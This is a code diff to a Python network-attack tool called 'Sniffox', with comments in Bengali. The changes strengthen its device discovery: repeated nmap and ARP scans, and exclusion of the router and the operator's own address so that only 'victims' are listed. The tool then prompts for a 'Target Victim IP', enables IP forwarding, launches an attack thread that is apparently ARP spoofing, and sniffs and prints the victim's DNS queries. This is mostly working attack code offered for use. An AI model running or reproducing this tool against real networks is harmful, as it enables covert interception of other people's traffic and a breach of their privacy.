@@ -21,16 +21,16 @@ def print_banner():
 {Fore.YELLOW}             ~~>  V  <~~
 {Fore.RED}              \\  \\|/  /
 {Fore.RED}               `-----'__
-{Fore.RED}               /     \\  `^\\_
-{Fore.RED}              {{       }}\\ |\\_\\_   {Fore.YELLOW}W
+{Fore.RED}               /      \\  `^\\_
+{Fore.RED}              {{        }}\\ |\\_\\_   {Fore.YELLOW}W
 {Fore.RED}              |  \\_/  |/ /  \\_\\_({Fore.WHITE} {Fore.RED})
-{Fore.RED}               \\__/  /(_E     \\__/
+{Fore.RED}               \\__/  /(_E      \\__/
 {Fore.RED}                 (  /
 {Fore.RED}                  MM
     """
     text_banner = f"""
 {Fore.YELLOW} ███████ ███    ██ ██ ███████ ███████  ██████  ██   ██
-{Fore.YELLOW} ██      ████   ██ ██ ██      ██      ██    ██  ██ ██
+{Fore.YELLOW} ██      ████   ██ ██ ██      ██      ██    ██ ██  ██
 {Fore.WHITE} ███████ ██ ██  ██ ██ █████   █████   ██    ██   ███
 {Fore.RED}      ██ ██  ██ ██ ██ ██      ██      ██    ██  ██ ██
 {Fore.RED} ███████ ██   ████ ██ ██      ██       ██████  ██   ██
@@ -52,24 +52,36 @@ def get_network_details():
         print(f"{Fore.CYAN}[ STATS ] {Fore.WHITE}Default Gateway : {Fore.YELLOW}{gateway_ip}")
         print(f"{Fore.CYAN}[ STATS ] {Fore.WHITE}Your Local IP   : {Fore.YELLOW}{my_ip}")
         print(f"{Fore.RED} -----------------------------------------------------------")
-        return gateway_ip, interface, network_range
+        return gateway_ip, interface, network_range, my_ip
     except:
         sys.exit(f"{Fore.RED}[!] Error Fetching Network.")
 
-def extreme_nmap_scan(network_range, gateway_ip):
-    # আপনার রিকোয়েস্ট অনুযায়ী ৬ বার পাওয়ারফুল স্ক্যান
-    print(f"\n{Fore.CYAN}[*] Sniffox Extreme Engine: Scanning 6 times for hidden devices...")
+def extreme_nmap_scan(network_range, gateway_ip, my_ip, interface):
+    # আপনার রিকোয়েস্ট অনুযায়ী স্ক্যানিং ইঞ্জিনকে চরম শক্তিশালী করা হয়েছে
+    print(f"{Fore.YELLOW}[*] Force-Waking all devices in {network_range}...")
+    
+    # ব্যাকগ্রাউন্ডে ২বার নক করা যাতে ঘুমন্ত ডিভাইস জেগে উঠে (Predator logic)
+    for _ in range(2):
+        subprocess.Popen(f"sudo nmap -sn -T5 {network_range} > /dev/null 2>&1", shell=True)
+        scapy.arping(network_range, verbose=False, timeout=1)
+    
+    time.sleep(3) # ডিভাইসগুলো জেগে ওঠার জন্য ৩ সেকেন্ড সময়
+
+    print(f"{Fore.CYAN}[*] Sniffox Extreme Engine: Gathering device list...")
     print(f"{Fore.WHITE}{'-'*75}")
     print(f"{Fore.WHITE}{'IP Address':<16} | {'MAC Address':<18} | {'Vendor/Brand'}")
     print(f"{Fore.WHITE}{'-'*75}")
     
     temp_file = "sniffox_scan.xml"
     devices = {}
+    
     try:
-        for i in range(1, 7): # ৬ বার স্ক্যান লুপ
+        # ৬ বার গভীর স্ক্যান করে নিশ্চিত হওয়া
+        for i in range(1, 7):
             sys.stdout.write(f"\r{Fore.YELLOW}[*] Scanning Pass: {i}/6 ... ")
             sys.stdout.flush()
-            # -T4 দিয়ে স্পিড বাড়ানো হয়েছে এবং -PR দিয়ে ARP স্ক্যান নিশ্চিত করা হয়েছে
+            
+            # ARP + ICMP Combined Scan
             os.system(f"sudo nmap -sn -PR -T4 {network_range} -oX {temp_file} > /dev/null")
             
             if os.path.exists(temp_file):
@@ -77,19 +89,20 @@ def extreme_nmap_scan(network_range, gateway_ip):
                 root = tree.getroot()
                 for host in root.findall('host'):
                     ip = host.find("./address[@addrtype='ipv4']").get('addr')
-                    mac, vendor = "N/A", "Unknown"
-                    mac_el = host.find("./address[@addrtype='mac']")
-                    if mac_el is not None:
-                        mac = mac_el.get('addr')
-                        vendor = mac_el.get('vendor', 'Unknown')
-                    if ip not in devices: devices[ip] = (mac, vendor)
-            time.sleep(0.5) # ছোট পজ যাতে স্ক্যানিং আরও নিখুঁত হয়
+                    # গেটওয়ে এবং নিজের আইপিকে লিস্টে দেখাবে না, শুধু ভিকটিমদের দেখাবে
+                    if ip != gateway_ip and ip != my_ip:
+                        mac, vendor = "Unknown", "Unknown"
+                        mac_el = host.find("./address[@addrtype='mac']")
+                        if mac_el is not None:
+                            mac = mac_el.get('addr')
+                            vendor = mac_el.get('vendor', 'Unknown')
+                        if ip not in devices: devices[ip] = (mac, vendor)
+            time.sleep(0.3)
             
-        print(f"\n{Fore.GREEN}[+] Scan Complete! Listing all found devices:\n")
+        print(f"\n{Fore.GREEN}[+] Scan Complete! {len(devices)} active devices found (excluding you & router).\n")
+        
         for ip, (mac, vendor) in sorted(devices.items()):
-            color = Fore.GREEN if ip != gateway_ip else Fore.WHITE
-            tag = " (Router)" if ip == gateway_ip else ""
-            print(f"{color}{ip:<16} | {Fore.YELLOW}{mac:<18} | {vendor}{tag}")
+            print(f"{Fore.GREEN}{ip:<16} | {Fore.YELLOW}{mac:<18} | {vendor}")
                 
         if os.path.exists(temp_file): os.remove(temp_file)
         return devices
@@ -97,7 +110,6 @@ def extreme_nmap_scan(network_range, gateway_ip):
         print(f"\n{Fore.RED}[!] Scan Error: {e}")
         return {}
 
-# বাকি অ্যাটাক লজিক একই থাকবে...
 class SniffoxAttack:
     def __init__(self, target_ip, gateway_ip, interface, target_mac):
         self.target_ip = target_ip
@@ -122,14 +134,22 @@ if __name__ == "__main__":
     clear_screen()
     print_banner()
     os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
-    gw, iface, net_range = get_network_details()
-    active_devices = extreme_nmap_scan(net_range, gw) # ৬ বার স্ক্যান কল করা হয়েছে
     
+    gw, iface, net_range, my_ip = get_network_details()
+    
+    # গেটওয়ে এবং নিজের আইপি বাদ দিয়ে ৬ বার পাওয়ারফুল স্ক্যান
+    active_devices = extreme_nmap_scan(net_range, gw, my_ip, iface) 
+    
+    if not active_devices:
+        print(f"{Fore.RED}[!] No target devices found in network.")
+        sys.exit()
+
     target = input(f"\n{Fore.WHITE}Target Victim IP: ")
     t_data = active_devices.get(target)
     
-    if t_data and t_data[0] != "N/A":
+    if t_data and t_data[0] != "Unknown":
         t_mac = t_data[0]
+        # গেটওয়ে ম্যাক বের করা
         ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=gw), timeout=2, verbose=False)[0]
         gw_mac = ans[0][1].hwsrc if ans else None
         
@@ -138,8 +158,12 @@ if __name__ == "__main__":
             threading.Thread(target=attack.run, args=(gw_mac,), daemon=True).start()
             try:
                 print(f"{Fore.MAGENTA}[*] Logging DNS Traffic ... (Press Ctrl+C to stop)\n")
-                scapy.sniff(iface=iface, filter="udp port 53", store=False, prn=lambda x: print(f"{Fore.CYAN}[DNS LOG] Victim visited: {x[scapy.DNSQR].qname.decode()}") if x.haslayer(scapy.DNSQR) else None)
+                scapy.sniff(iface=iface, filter="udp port 53", store=False, 
+                            prn=lambda x: print(f"{Fore.CYAN}[DNS LOG] Victim visited: {x[scapy.DNSQR].qname.decode()}") 
+                            if x.haslayer(scapy.DNSQR) else None)
             except KeyboardInterrupt:
                 print(f"\n{Fore.RED}[!] Sniffox connection closed.")
+        else:
+            print(f"{Fore.RED}[!] Error: Could not resolve Gateway MAC.")
     else:
         print(f"{Fore.RED}[!] Error: Target offline or MAC not found.")
